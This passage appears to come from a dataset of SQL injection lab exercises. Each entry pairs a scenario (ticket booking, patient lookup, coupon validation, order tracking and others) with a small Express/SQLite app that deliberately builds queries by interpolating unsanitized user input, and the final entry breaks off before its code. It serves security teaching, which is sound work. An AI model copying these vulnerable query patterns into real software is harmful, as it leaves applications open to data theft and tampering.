  "Lab scenario": "SQL injection in cinema ticket booking system",
  "Lab Description": "A cinema ticket booking API constructs queries from seat selection input without proper sanitization. Attackers can inject SQL to book seats beyond the available inventory.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE tickets (id INTEGER PRIMARY KEY, seat TEXT, available INTEGER)\");\n  db.run(\"INSERT INTO tickets (seat, available) VALUES ('A1', 1)\");\n});\n\napp.post('/bookTicket', (req, res) => {\n  const seat = req.body.seat;\n  const query = `UPDATE tickets SET available = 0 WHERE seat = '${seat}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Ticket booked');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in inventory reorder system",
  "Lab Description": "An inventory management system calculates reorder quantities based on unsanitized product IDs. Attackers can inject SQL to force unauthorized reorders.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE inventory (id INTEGER PRIMARY KEY, product TEXT, stock INTEGER)\");\n  db.run(\"INSERT INTO inventory (product, stock) VALUES ('Keyboard', 20)\");\n});\n\napp.post('/reorder', (req, res) => {\n  const productId = req.body.productId;\n  const query = `UPDATE inventory SET stock = stock + 10 WHERE id = '${productId}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Reorder triggered');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in academic exam score retrieval",
  "Lab Description": "A university portal retrieves exam scores based on student IDs provided by the user. Unsanitized input allows attackers to inject SQL and view scores for all students.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE exam_scores (id INTEGER PRIMARY KEY, student TEXT, score INTEGER)\");\n  db.run(\"INSERT INTO exam_scores (student, score) VALUES ('John Doe', 85)\");\n});\n\napp.post('/getScore', (req, res) => {\n  const studentId = req.body.studentId;\n  const query = `SELECT * FROM exam_scores WHERE id = '${studentId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in job application portal search",
  "Lab Description": "A job application portal allows recruiters to search for candidates using keywords. Unsanitized input in the search query enables attackers to inject SQL to retrieve all candidate applications.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE applications (id INTEGER PRIMARY KEY, candidate TEXT, position TEXT)\");\n  db.run(\"INSERT INTO applications (candidate, position) VALUES ('Jane Smith', 'Engineer')\");\n});\n\napp.get('/searchCandidates', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM applications WHERE candidate LIKE '%${keyword}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in online forum post retrieval",
  "Lab Description": "An online forum retrieves posts based on a topic specified by the user. Unsanitized topic input enables attackers to inject SQL to retrieve posts from all topics.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE forum_posts (id INTEGER PRIMARY KEY, topic TEXT, content TEXT)\");\n  db.run(\"INSERT INTO forum_posts (topic, content) VALUES ('tech', 'Discussion on tech trends')\");\n});\n\napp.get('/posts', (req, res) => {\n  const topic = req.query.topic;\n  const query = `SELECT * FROM forum_posts WHERE topic = '${topic}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in user profile photo update",
  "Lab Description": "A profile photo update endpoint uses unsanitized image file names in its SQL query. Attackers can inject SQL to modify or retrieve profile information.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE profiles (id INTEGER PRIMARY KEY, username TEXT, photo TEXT)\");\n  db.run(\"INSERT INTO profiles (username, photo) VALUES ('bob', 'default.jpg')\");\n});\n\napp.post('/updatePhoto', (req, res) => {\n  const username = req.body.username;\n  const photo = req.body.photo;\n  const query = `UPDATE profiles SET photo = '${photo}' WHERE username = '${username}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Profile photo updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in coupon code validation system",
  "Lab Description": "A coupon validation endpoint uses unsanitized coupon codes in its SQL query, allowing attackers to inject SQL to bypass discount restrictions.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE coupons (id INTEGER PRIMARY KEY, code TEXT, discount INTEGER)\");\n  db.run(\"INSERT INTO coupons (code, discount) VALUES ('DISCOUNT50', 50)\");\n});\n\napp.post('/validateCoupon', (req, res) => {\n  const code = req.body.code;\n  const query = `SELECT discount FROM coupons WHERE code = '${code}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (row) res.send(`Coupon valid: ${row.discount}% off`);\n    else res.send('Invalid coupon');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in patient record lookup",
  "Lab Description": "A healthcare system retrieves patient records using unsanitized patient IDs. Attackers can inject SQL to access confidential patient information.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE patients (id INTEGER PRIMARY KEY, name TEXT, diagnosis TEXT)\");\n  db.run(\"INSERT INTO patients (name, diagnosis) VALUES ('John Doe', 'Hypertension')\");\n});\n\napp.post('/getPatient', (req, res) => {\n  const patientId = req.body.patientId;\n  const query = `SELECT * FROM patients WHERE id = '${patientId}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(row);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in vehicle registration query",
  "Lab Description": "A vehicle registration system retrieves details based on a license plate number provided by the user. Unsanitized input enables attackers to inject SQL and retrieve registration details of any vehicle.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE vehicles (id INTEGER PRIMARY KEY, plate TEXT, owner TEXT)\");\n  db.run(\"INSERT INTO vehicles (plate, owner) VALUES ('ABC123', 'Jane Doe')\");\n});\n\napp.get('/vehicleInfo', (req, res) => {\n  const plate = req.query.plate;\n  const query = `SELECT * FROM vehicles WHERE plate = '${plate}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in donation management portal",
  "Lab Description": "A donation management system retrieves donor records using unsanitized inputs. Attackers can inject SQL to access donation histories and modify donation amounts.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE donations (id INTEGER PRIMARY KEY, donor TEXT, amount REAL)\");\n  db.run(\"INSERT INTO donations (donor, amount) VALUES ('Alice', 100)\");\n});\n\napp.post('/getDonations', (req, res) => {\n  const donor = req.body.donor;\n  const query = `SELECT * FROM donations WHERE donor = '${donor}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in course registration system",
  "Lab Description": "A university course registration portal uses unsanitized course codes in its SQL queries. Attackers can inject SQL to register for courses without proper authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE courses (id INTEGER PRIMARY KEY, code TEXT, seats INTEGER)\");\n  db.run(\"INSERT INTO courses (code, seats) VALUES ('CS101', 50)\");\n});\n\napp.post('/registerCourse', (req, res) => {\n  const courseCode = req.body.courseCode;\n  const query = `UPDATE courses SET seats = seats - 1 WHERE code = '${courseCode}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Course registration updated');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in order tracking for logistics",
  "Lab Description": "A logistics tracking system uses unsanitized order IDs in its SQL query, allowing an attacker to inject SQL to retrieve tracking information for any order.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, tracking TEXT)\");\n  db.run(\"INSERT INTO orders (tracking) VALUES ('TRACK123')\");\n});\n\napp.post('/trackOrder', (req, res) => {\n  const orderId = req.body.orderId;\n  const query = `SELECT tracking FROM orders WHERE id = '${orderId}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send(row ? row.tracking : 'No order found');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in hotel loyalty program",
  "Lab Description": "A hotel loyalty program retrieves user points based on unsanitized inputs. Attackers can inject SQL to view or modify loyalty points for any account.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE loyalty (id INTEGER PRIMARY KEY, username TEXT, points INTEGER)\");\n  db.run(\"INSERT INTO loyalty (username, points) VALUES ('guest', 100)\");\n});\n\napp.post('/loyalty', (req, res) => {\n  const username = req.body.username;\n  const query = `SELECT points FROM loyalty WHERE username = '${username}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(row);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in supplier management system",
  "Lab Description": "A supplier management system retrieves supplier details using unsanitized supplier IDs, allowing attackers to inject SQL and obtain data for all suppliers.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE suppliers (id INTEGER PRIMARY KEY, name TEXT, contact TEXT)\");\n  db.run(\"INSERT INTO suppliers (name, contact) VALUES ('SupplierX', 'contact@supplierx.com')\");\n});\n\napp.post('/getSupplier', (req, res) => {\n  const supplierId = req.body.supplierId;\n  const query = `SELECT * FROM suppliers WHERE id = '${supplierId}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(row);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in CMS article retrieval",
  "Lab Description": "A content management system retrieves articles based on a category specified by the user. Unsanitized input allows attackers to inject SQL and retrieve articles from any category.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles (id INTEGER PRIMARY KEY, category TEXT, content TEXT)\");\n  db.run(\"INSERT INTO articles (category, content) VALUES ('tech', 'Tech article content')\");\n});\n\napp.get('/articles', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM articles WHERE category = '${category}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in dynamic advertisement retrieval",
  "Lab Description": "An advertisement server retrieves ads based on unsanitized parameters. Attackers can inject SQL to control which ads are shown or to retrieve ad campaign data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE ads (id INTEGER PRIMARY KEY, category TEXT, content TEXT)\");\n  db.run(\"INSERT INTO ads (category, content) VALUES ('sports', 'Sports ad content')\");\n});\n\napp.post('/getAds', (req, res) => {\n  const category = req.body.category;\n  const query = `SELECT * FROM ads WHERE category = '${category}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in order cancellation endpoint",
  "Lab Description": "A system allows users to cancel orders by providing an order ID via a POST request. The unsanitized order ID lets attackers cancel orders they do not own.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, status TEXT)\");\n  db.run(\"INSERT INTO orders (status) VALUES ('active')\");\n});\n\napp.post('/cancelOrder', (req, res) => {\n  const orderId = req.body.orderId;\n  const query = `UPDATE orders SET status = 'cancelled' WHERE id = '${orderId}'`;\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Order cancelled');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in newsletter subscription",
  "Lab Description": "A newsletter subscription form directly concatenates the email address into an INSERT query, enabling attackers to inject SQL and add unauthorized emails.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE subscribers (id INTEGER PRIMARY KEY, email TEXT)\");\n});\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO subscribers (email) VALUES ('${email}')`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Subscription successful');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in blog post retrieval",
  "Lab Description": "A blog platform retrieves posts based on a title provided via a query string. Unsanitized input allows attackers to inject SQL and retrieve all posts.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE posts (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO posts (title, content) VALUES ('Hello World', 'This is a blog post')\");\n});\n\napp.get('/getPost', (req, res) => {\n  const title = req.query.title;\n  const query = `SELECT * FROM posts WHERE title = '${title}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in product discount retrieval",
  "Lab Description": "A discount lookup endpoint retrieves discount details based on a coupon code from the query string. Unsanitized input allows attackers to inject SQL and retrieve all discount data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE discounts (id INTEGER PRIMARY KEY, code TEXT, value INTEGER)\");\n  db.run(\"INSERT INTO discounts (code, value) VALUES ('SAVE10', 10)\");\n});\n\napp.get('/getDiscount', (req, res) => {\n  const code = req.query.code;\n  const query = `SELECT * FROM discounts WHERE code = '${code}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in file download by filename",
  "Lab Description": "A file download endpoint takes a filename from the query and constructs an SQL query without sanitization. Attackers can inject SQL to download files they shouldn\u2019t access.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE files (id INTEGER PRIMARY KEY, filename TEXT, content TEXT)\");\n  db.run(\"INSERT INTO files (filename, content) VALUES ('secret.txt', 'Top secret content')\");\n});\n\napp.get('/download', (req, res) => {\n  const file = req.query.file;\n  const query = `SELECT content FROM files WHERE filename = '${file}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (row) res.send(row.content);\n    else res.send('File not found');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in customer review filter",
  "Lab Description": "A customer review filter endpoint uses user-supplied rating to filter reviews. Unsanitized input allows attackers to manipulate the query and retrieve reviews beyond intended criteria.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reviews (id INTEGER PRIMARY KEY, rating INTEGER, comment TEXT)\");\n  db.run(\"INSERT INTO reviews (rating, comment) VALUES (4, 'Good product')\");\n});\n\napp.post('/filterReviews', (req, res) => {\n  const rating = req.body.rating;\n  const query = `SELECT * FROM reviews WHERE rating = ${rating}`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in file export module with filter condition",
  "Lab Description": "An export function for user data uses unsanitized filter input to build an SQL query. Attackers can inject SQL to export data from unintended tables.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE exportData (id INTEGER PRIMARY KEY, info TEXT)\");\n  db.run(\"INSERT INTO exportData (info) VALUES ('Sensitive data')\");\n});\n\napp.post('/export', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM exportData WHERE info LIKE '%${filter}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in order tracking system",
  "Lab Description": "An order tracking endpoint constructs a query using an unsanitized order ID from the request body. Attackers can inject SQL to view tracking information for all orders.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, tracking TEXT)\");\n  db.run(\"INSERT INTO orders (tracking) VALUES ('TRACK001')\");\n});\n\napp.post('/track', (req, res) => {\n  const orderId = req.body.orderId;\n  const query = `SELECT tracking FROM orders WHERE id = '${orderId}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send(row ? row.tracking : 'Order not found');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in online coupon redemption",
  "Lab Description": "A coupon redemption API uses unsanitized coupon codes in its SQL query, allowing attackers to inject SQL and redeem invalid coupons.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE coupons (id INTEGER PRIMARY KEY, code TEXT, discount INTEGER)\");\n  db.run(\"INSERT INTO coupons (code, discount) VALUES ('OFF50', 50)\");\n});\n\napp.post('/redeem', (req, res) => {\n  const code = req.body.code;\n  const query = `SELECT discount FROM coupons WHERE code = '${code}'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else if (row) res.send(`Coupon redeemed: ${row.discount}% off`);\n    else res.send('Invalid coupon');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in customer feedback sentiment analysis",
  "Lab Description": "A sentiment analysis endpoint for customer feedback uses unsanitized feedback text in its SQL query. Attackers can inject SQL to retrieve or manipulate feedback records.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE feedback (id INTEGER PRIMARY KEY, comment TEXT)\");\n  db.run(\"INSERT INTO feedback (comment) VALUES ('Great service')\");\n});\n\napp.post('/analyze', (req, res) => {\n  const comment = req.body.comment;\n  const query = `SELECT * FROM feedback WHERE comment LIKE '%${comment}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in restaurant reservation system",
  "Lab Description": "A restaurant reservation endpoint takes a table number as input and constructs an SQL query without sanitization. Attackers can inject SQL to reserve tables without proper authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reservations (id INTEGER PRIMARY KEY, table_number TEXT, reserved INTEGER)\");\n  db.run(\"INSERT INTO reservations (table_number, reserved) VALUES ('T1', 0)\");\n});\n\napp.post('/reserve', (req, res) => {\n  const tableNumber = req.body.table_number;\n  const query = `UPDATE reservations SET reserved = 1 WHERE table_number = '${tableNumber}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Reservation successful');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in vehicle registration lookup",
  "Lab Description": "A vehicle registration lookup service uses an unsanitized license plate number to build an SQL query, allowing attackers to retrieve details for any vehicle.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE vehicles (id INTEGER PRIMARY KEY, plate TEXT, owner TEXT)\");\n  db.run(\"INSERT INTO vehicles (plate, owner) VALUES ('XYZ789', 'Bob')\");\n});\n\napp.get('/vehicleInfo', (req, res) => {\n  const plate = req.query.plate;\n  const query = `SELECT * FROM vehicles WHERE plate = '${plate}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in customer order history retrieval",
  "Lab Description": "A retail website retrieves order histories based on a customer ID provided via a query parameter. Unsanitized input allows an attacker to inject SQL and retrieve order histories for all customers.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, customerId TEXT, details TEXT)\");\n  db.run(\"INSERT INTO orders (customerId, details) VALUES ('cust123', 'Order details for cust123')\");\n});\n\napp.get('/orderHistory', (req, res) => {\n  const customerId = req.query.customerId;\n  // Vulnerable: unsanitized input directly concatenated\n  const query = `SELECT * FROM orders WHERE customerId = '${customerId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in support ticket tracking",
  "Lab Description": "A support system retrieves ticket statuses using an unsanitized ticket ID from the request body. Attackers can inject SQL to view the status of all tickets.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
